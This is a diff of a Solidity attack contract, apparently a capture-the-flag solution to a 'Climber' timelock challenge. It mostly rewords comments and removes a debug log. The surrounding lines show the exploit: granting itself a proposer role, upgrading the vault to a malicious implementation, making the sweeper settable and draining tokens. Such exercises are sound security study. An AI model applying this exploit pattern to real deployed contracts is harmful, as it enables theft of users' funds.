@@ -42,7 +42,7 @@ contract ClimberAttacker {
             , abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this))
         );
 
-        //3: now that I am a proposer, I can schedule the 2 previous actions in the timelock so that they can be executed
+        //3: now that the contract is a proposer, I can schedule the 2 previous actions in the timelock so that they can be executed
         addOperation(
             address(this)
             , 0
@@ -59,7 +59,7 @@ contract ClimberAttacker {
             , abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(new VaultAttacker()))
         );
 
-        //6: I made the _setSweeper function public so that I can set the sweeper to myself
+        //6: I made the _setSweeper function public so that I can set myself as the sweeper
         addOperation(
             vault
             , 0
@@ -72,9 +72,8 @@ contract ClimberAttacker {
             , 0
             , abi.encodeWithSelector(VaultAttacker.sweepFunds.selector, token)
         );
-
+        //8: because I'm the proposer, I can now schedule the operations right away (compared to step 3)
         scheduleOperations();
-        //because I'm the proposer, I can execute the operations right away
         executeOperations();
 
     }
@@ -98,7 +97,6 @@ contract ClimberAttacker {
     }
 
     function scheduleOperations() public {
-        console.log("ClimberAttacker.scheduleOperations: entered by %s", msg.sender);
         ClimberTimelock(timeLock).schedule(targets, values, dataElements, salt);
     }
 
